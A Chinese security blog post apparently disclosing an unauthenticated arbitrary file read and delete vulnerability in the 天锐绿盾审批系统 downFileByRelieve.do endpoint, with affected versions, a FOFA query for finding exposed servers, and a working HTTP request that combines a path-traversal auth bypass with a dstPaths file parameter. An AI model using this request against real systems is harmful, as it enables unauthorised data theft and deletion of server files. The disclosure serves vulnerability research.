---
title: "天锐绿盾审批系统 downFileByRelieve.do 任意文件读取+删除漏洞"
source: https://mrxn.net/jswz/trwfe-downFileByRelieve-file-read.html
asset_dir: assets/天锐绿盾审批系统-downfilebyrelieve.do-任意文件读取+删除漏洞
---

# 天锐绿盾审批系统 downFileByRelieve.do 任意文件读取+删除漏洞

[Mrxn](https://mrxn.net/author/1)* 发表于2025/12/15 08:31
* 354浏览
* [0评论](#comment)
* 10分钟阅读

深入探索

鉴权

数据库

软件


(adsbygoogle = window.adsbygoogle || []).push({});

---

# 漏洞简介

天锐绿盾审批系统是一款专注于企业数据安全与合规管理的智能审批平台，深度融合文档加密、权限管控与流程自动化，为企业提供从文件创建、流转到归档的全生命周期安全管控。

漏洞修复方案

该系统的 `downFileByRelieve.do` 接口存在任意[文件读取](https://mrxn.net/tag/%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96)漏洞。未经身份验证的攻击者可以通过该漏洞读取系统上的任意文件，从而可能获取数据库敏感信息或其他重要配置信息，导致数据泄露。

# 影响版本

> 可通过访问 /trwfe/exports/config.ini 获取版本信息

V3.53.240913

深入探索

VPN服务

Web安全书籍

云安全解决方案

V7.05.240904

# fofa语法

> app="TIPPAY-绿盾审批系统"
>
> Windows安全工具

# 漏洞分析

先看`downFileByRelieve.do`的实现

[![天锐绿盾审批系统 downFileByRelieve.do 任意文件读取+删除漏洞](images/img-001-2574ea71af4e.webp)](https://image.mrxn.net/0260bd53a2494b41941e1b3845c22ace.webp)

最终都会删除传入的文件

深入探索

SQL注入防护

服务器安全服务

SQL注入检测工具

[![天锐绿盾审批系统 downFileByRelieve.do 任意文件读取+删除漏洞](images/img-002-19375c371531.webp)](https://image.mrxn.net/ae95a70abe194652a1bd0639667f25cf.webp)

跟进`fileService.downLoadFile` 方法，看下`fileService.downLoadFile`的实现逻辑

网络安全

[![天锐绿盾审批系统 downFileByRelieve.do 任意文件读取+删除漏洞](images/img-003-23c978e49e20.webp)](https://image.mrxn.net/2baddfb1752a4fd195376a893e5589ea.webp)

**直接将从用户端接收的** `dstPaths` **参数，不经验证地用于** `new FileInputStream(((DownFileMsg)files.get(0)).getFile())` **来实例化文件对象，并最终传递给** `FileInputStream` **进行[读取](https://mrxn.net/tag/%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96)**，攻击者可以构造包含绝对路径或 `../` 目录遍历序列的恶意 `dstPath` 参数，读取服务器文件系统上任意位置的、具有应用运行权限可读的任何文件。

计算机驱动器和存储设备

`fileService.downLoadFile`最终会删除读取的文件

[![天锐绿盾审批系统 downFileByRelieve.do 任意文件读取+删除漏洞](images/img-004-01bb223800f3.webp)](https://image.mrxn.net/f35530639875416e9beffd9d243300d5.webp)

测试时应该谨慎测试，最好自己上传一个文件来测试，避免删除了系统重要文件导致系统宕机的尴尬。

# 漏洞复现

> 漏洞测试会删除对应文件，谨慎测试
>
> 漏洞修复方案

```
POST /trwfe/login.jsp/.%2e/file/downFileByRelieve.do HTTP/1.1
Host: trwfe.mrxn.net
Content-Type: application/x-www-form-urlencoded

dstPaths=c:\a.txt&fileNames=1.png&isDirArr=0&processInstanceIds=&isapproval=auto
```

成功读取到`c:\a.txt`文件内容

[![天锐绿盾审批系统 downFileByRelieve.do 任意文件读取+删除漏洞](images/img-005-363478099ea0.webp)](https://image.mrxn.net/18279c4eecec4a10b93651585430d5f3.webp)

* 标签：
* [#漏洞](https://mrxn.net/tag/%E6%BC%8F%E6%B4%9E)
* [#web安全](https://mrxn.net/tag/web%E5%AE%89%E5%85%A8)
* [#代码审计](https://mrxn.net/tag/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1)
* [#Java](https://mrxn.net/tag/Java)
* [#0day](https://mrxn.net/tag/0day)
* [#文件读取](https://mrxn.net/tag/%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96)

---


// 获取当前脚本所在的父容器
const parentContainer = document.currentScript.parentElement;
let searchContainer = parentContainer.querySelector('article') || parentContainer;
if (searchContainer) {
// 优先在 class 名为 prose 或 markdown 的容器内搜索 img 图片
let images = [];
const containers = searchContainer.querySelectorAll('.prose, .markdown');
containers.forEach(function(container) {
images = images.concat(Array.from(container.querySelectorAll('img')));
});
if (images.length === 0) {
images = searchContainer.querySelectorAll('img');
}
images.forEach(function(img) {
if (img.getAttribute('data-action') === 'zoom') {
const parentLink = img.parentNode;
if (parentLink.tagName === 'A') {
parentLink.setAttribute('data-fancybox', 'gallery');
}
} else {
const link = document.createElement('a');
link.setAttribute('data-fancybox', 'gallery');
link.setAttribute('href', img.getAttribute('src'));
img.parentNode.insertBefore(link, img);
link.appendChild(img);
}
});
// 初始化 Fancybox
Fancybox.bind("[data-fancybox]", {
// 您的自定义选项
});
}

文章目录
×

* [1.漏洞简介](#toc-1-)
* [2.影响版本](#toc-2-)
* [3.fofa语法](#toc-3-)
* [4.漏洞分析](#toc-4-)
* [5.漏洞复现](#toc-5-)



.x\_nav\_toc {
position: fixed;
top: 0;
right: -300px;
width: 280px;
height: 100%;
background-color: white;
box-shadow: -2px 0 15px rgba(0, 0, 0, 0.1);
z-index: 1000;
transition: right 0.3s ease;
display: flex;
flex-direction: column;
overflow: hidden;
padding-top: 10px;
}
.x\_nav\_toc.active {
right: 0;
}
.x\_toc\_header {
display: flex;
justify-content: space-between;
align-items: center;
padding: 15px 20px;
height: 48px;
border-bottom: 1px solid #eee;
}
.x\_toc\_title {
font-size: 18px;
font-weight: bold;
color: #333;
}
.x\_toc\_close {
background: none;
border: none;
font-size: 24px;
cursor: pointer;
color: #777;
transition: color 0.2s;
}
.x\_toc\_close:hover {
color: #333;
}
.x\_toc\_content {
flex: 1;
overflow-y: auto;
padding: 15px 20px;
padding-right: 10px;
}
.x\_anchor-list {
list-style-type: none;
padding: 0;
margin: 0;
}
/\* 减小目录项间距 \*/
.x\_anchor-list li {
margin-bottom: 4px; /\* 间距从8px减小到4px \*/
}
.x\_anchor-list a {
text-decoration: none;
color: #555;
display: block;
padding: 6px 10px; /\* 减少内边距 \*/
transition: all 0.2s;
font-size: 14px;
border-radius: 4px;
line-height: 1.4; /\* 减小行高 \*/
}
.x\_anchor-list a:hover,
.x\_anchor-list a:focus {
background-color: #f8f9fa;
color: #0068d6;
}
.toc-number {
font-weight: 600;
margin-right: 8px;
color: #495057;
display: inline-block;
min-width: 25px;
}
/\* 减小各级标题间距 \*/
.toc-h1 {
font-weight: 600;
font-size: 15px;
margin-top: 10px; /\* 上边距从15px减小到10px \*/
padding-left: 5px !important;
}
.toc-h2 {
font-size: 14px;
padding-left: 15px !important; /\* 缩进从20px减小到15px \*/
}
.toc-h3 {
font-size: 13px;
padding-left: 25px !important; /\* 缩进从30px减小到25px \*/
}
.toc-h4 {
font-size: 12px;
padding-left: 35px !important; /\* 缩进从40px减小到35px \*/
}
/\* 修改后的切换按钮样式 - 使用图标且位置下移 \*/
.x\_toc\_toggle {
position: fixed;
bottom:120px; right: 17px;width:40px;height:40px;background-color:white;
border-radius: 50%;
border: none;
cursor: pointer;
box-shadow: 0 4px 12px rgba(0,0,0,0.15);
z-index: 999;
transition: all 0.3s ease;
display: flex;
align-items: center;
justify-content: center;
padding: 0;
}
.x\_toc\_toggle svg {
width:24px;height:24px;stroke:#3d9bff;
}
.x\_toc\_toggle:hover {
#background-color: #0081f8;
transform: translateY(-3px);
box-shadow: 0 6px 15px rgba(0,0,0,0.2);
}
@media (max-width: 768px) {
.x\_nav\_toc {
width: 280px;
}
.x\_toc\_toggle {
bottom: 100px; /\* 手机端也下移位置 \*/
right: 30px;
width: 40px;
height: 40px;
}
.x\_toc\_toggle svg {
width: 20px;
height: 20px;
}
}

document.addEventListener('DOMContentLoaded', function() {
// 获取所有标题元素
var className = ".line-numbers";
var selectors = [];
for (var i = 1; i <= 6; i++) {
selectors.push(className + ' h' + i);
}
var headings = document.querySelectorAll(selectors.join(', '));
// 获取DOM元素
var tocContainer = document.querySelector('.x\_nav\_toc');
var toggleButton = document.querySelector('.x\_toc\_toggle');
var tocList = document.querySelector('.x\_anchor-list');
var closeButton = document.querySelector('.x\_toc\_close');
var currentHighlight = null;
// 检测是否为移动设备
const isMobile = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
// 如果没有标题，隐藏所有元素
if (headings.length === 0) {
tocContainer.style.display = 'none';
toggleButton.style.display = 'none';
return;
}
// 初始化层级计数器
var counters = [0, 0, 0, 0, 0, 0]; // h1-h6
var currentLevel = 0;
// 生成带数字编号的目录
headings.forEach(function(heading, index) {
var level = parseInt(heading.tagName[1]);
// 更新计数器
counters[level - 1] += 1; // 增加当前级别计数器
// 重置更低级计数器
for (var i = level; i < 6; i++) {
counters[i] = 0;
}
// 生成编号字符串（如"1.2.3"）
var numberParts = [];
for (var i = 0; i < level; i++) {
if (counters[i] > 0) {
numberParts.push(counters[i]);
}
}
var numberText = numberParts.join('.')+'.';
// 创建唯一ID
var id = 'toc-' + numberText.replace(/\./g, '-');
heading.id = id;
var listItem = document.createElement('li');
var anchor = document.createElement('a');
var numberSpan = document.createElement('span');
numberSpan.className = 'toc-number';
numberSpan.textContent = numberText;
anchor.appendChild(numberSpan);
anchor.innerHTML += heading.textContent;
anchor.href = '#' + id;
anchor.classList.add('toc-h' + level);
listItem.appendChild(anchor);
tocList.appendChild(listItem);
// 添加点击事件（不关闭目录）
anchor.addEventListener('click', function(e) {
e.preventDefault();
// 更新高亮状态
if (currentHighlight) {
currentHighlight.classList.remove('active');
}
this.classList.add('active');
currentHighlight = this;
// 滚动到对应位置
var targetId = this.getAttribute('href').substring(1);
var targetElement = document.getElementById(targetId);
if (targetElement) {
var header = document.querySelector("header");
var headerHeight = header ? header.offsetHeight : 0;
var elementPosition = targetElement.getBoundingClientRect().top + window.pageYOffset;
var offsetPosition = elementPosition - headerHeight - 20;
window.scrollTo({
top: offsetPosition,
behavior: 'smooth'
});
// 滚动到目录项的可视区域
this.scrollIntoView({behavior: 'smooth', block: 'nearest'});
// 点击事件中
if (isMobile) {
closeToc(); // 移动端点击后关闭目录
}
}
});
});
// 切换按钮点击事件
toggleButton.addEventListener('click', function() {
tocContainer.classList.add('active');
});
// 关闭按钮点击事件
closeButton.addEventListener('click', function(e) {
e.stopPropagation();
closeToc();
});
// 滚动时更新高亮状态
window.addEventListener('scroll', function() {
var fromTop = window.scrollY;
var header = document.querySelector("header");
var headerHeight = header ? header.getBoundingClientRect().height : 0; // 更精确的header高度
//console.log(headerHeight);
// 精准计算标题文档位置
var activeSection = null;
headings.forEach(function(heading) {
var section = document.getElementById(heading.id);
if (!section) return;
// 使用getBoundingClientRect获取精确位置
var rect = section.getBoundingClientRect();
var sectionTop = rect.top + fromTop; // 转换为文档顶部绝对位置
var sectionBottom = rect.bottom + fromTop + headerHeight;
// 增加20px激活区域缓冲
if (fromTop + headerHeight + 20 >= sectionTop && fromTop < sectionBottom) {
activeSection = heading;
}
});
// 更新高亮状态（新增精确边界判断）
if (activeSection) {
var tocLink = tocList.querySelector('a[href="#' + activeSection.id + '"]');
if (tocLink && currentHighlight !== tocLink) {
if (currentHighlight) {
currentHighlight.blur();
currentHighlight.classList.remove('active');
}
tocLink.classList.add('active');
tocLink.focus();
currentHighlight = tocLink;
// 平滑滚动到可视区域（改进触发条件）
var tocRect = tocLink.getBoundingClientRect();
var tocContainerRect = tocContainer.getBoundingClientRect();
if (tocRect.bottom > tocContainerRect.bottom || tocRect.top < tocContainerRect.top) {
tocLink.scrollIntoView({behavior: 'auto', block: 'nearest'});
}
}
}
});
// 关闭目录面板
function closeToc() {
tocContainer.classList.remove('active');
}
});

/\* 超小屏幕隐藏 \*/
@media (max-width: 768px) {
#qrcode-right {
display: none;
}
}

版权所有：[Mrxn's Blog](https://mrxn.net/)  
文章标题：[天锐绿盾审批系统 downFileByRelieve.do 任意文件读取+删除漏洞](https://mrxn.net/jswz/trwfe-downFileByRelieve-file-read.html)  
文章链接：<https://mrxn.net/jswz/trwfe-downFileByRelieve-file-read.html>  
本站文章均为原创，未经授权请勿用于任何商业用途。仅供安全研究和学习使用。若因传播、利用本文档信息而产生任何直接或间接的后果或损害，均由使用者自行承担，文章作者不为此承担任何责任。

Windows安全工具

![](data:image/png;base64,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)

设备上扫码阅读


var qrcode = new QRCode(document.getElementById("copyright-qrcode"), {
text: encodeURI("https://mrxn.net/jswz/trwfe-downFileByRelieve-file-read.html"),
width: 100,
height: 100,
colorDark: "#000000",
colorLight: "#ffffff",
correctLevel: QRCode.CorrectLevel.H
});

  

### 📚 推荐阅读

* [深信服运维安全管理系统 install\_patch 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-system-concentration_management-install_patch-rce.html)
* [深信服运维安全管理系统 del\_patch 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-system-concentration_management-del_patch-rce.html)
* [深信服运维安全管理系统 upload\_file 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-cssp-app-upload_file-rce.html)
* [深信服运维安全管理系统 csspost/update 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-csspost-update-rce.html)
* [深信服运维安全管理系统 save\_SNMP 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-SNMP-save_SNMP-rce.html)
* [深信服运维安全管理系统 getLdap 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-getLdap-rce.html)
* [深信服运维安全管理系统 Jwt 密钥硬编码](https://mrxn.net/jswz/sangfor_osm-login-search_login-token-leak.html)
* [深信服运维安全管理系统 del\_route 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-netConfig-del_route-rce.html)
* [深信服运维安全管理系统 del\_net 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-netConfig-del_net-rce.html)
* [深信服运维安全管理系统 change\_net 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-netConfig-change_net-rce.html)
* [大蚂蚁 (BigAnt) 即时通讯系统 updateLoginName SQL注入漏洞](https://mrxn.net/jswz/bigant-user-updateLoginName-sqli.html)
* [九佳易管理系统 PrivilegedCodeDestroy.asmx SQL注入漏洞](https://mrxn.net/jswz/a8erp-Interface-licx-PrivilegedCodeDestroy-sqli.html)
* [九佳易管理系统 Ajax\_XT.ashx SQL 注入漏洞](https://mrxn.net/jswz/a8erp-Ajax_XT-sqli.html)
* [大蚂蚁 (BigAnt) 即时通讯系统 moveDept SQL注入漏洞](https://mrxn.net/jswz/bigant-dept-moveDept-sqli.html)
* [青龙面板最新版v2.20.1 鉴权绕过致RCE漏洞](https://mrxn.net/jswz/qinglong-auth-bypass-rce.html)
* [九佳易管理系统 picHY.ashx SQL 注入漏洞](https://mrxn.net/jswz/a8erp-HuiYuanDangAn-picHY-sqli.html)
* [大蚂蚁 (BigAnt) 即时通讯系统 安装程序二次注入致远程代码执行漏洞](https://mrxn.net/jswz/bigant-install-config-rce.html)
* [东胜物流软件 MsChDuiController 多个SQL注入漏洞](https://mrxn.net/jswz/dongsheng-MsChDuiController-sqli.html)
* [大蚂蚁 (BigAnt) 即时通讯系统 PublicController 任意文件读取漏洞](https://mrxn.net/jswz/bigant-Public-download.html)
* [东胜物流软件 MsAnnounceController SQL注入漏洞](https://mrxn.net/jswz/dongsheng-MsAnnounce-GetData-sqli.html)

  

/\* 底部展示样式 \*/
.qrcode-bottom-box {
margin: 40px auto;
text-align: center;
}
.qrcode-title {
font-size: 16px;
color: #666;
margin-bottom: 0px;
font-weight: bold;
text-align: center;
}
.qrcode-bottom-box img {
display: inline-block;
padding: 10px;
background: #fff;
border-radius: 8px;
margin: 10px auto;
}
/\* 悬浮展示样式 \*/
.qrcode-float {
position: fixed;
z-index: 9999;
background: rgba(255,255,255,0.98);
padding: 20px;
border-radius: 12px;
}
.qrcode-float:hover {
transform: scale(1.05);
}
/\* 移动端适配 \*/
@media (max-width: 1440px) {
.qrcode-float {
right: 2%;
transform: none;
}
}
/\* 超小屏幕隐藏 \*/
@media (max-width: 768px) {
.qrcode-float {
display: none;
}
}

![](data:image/png;base64,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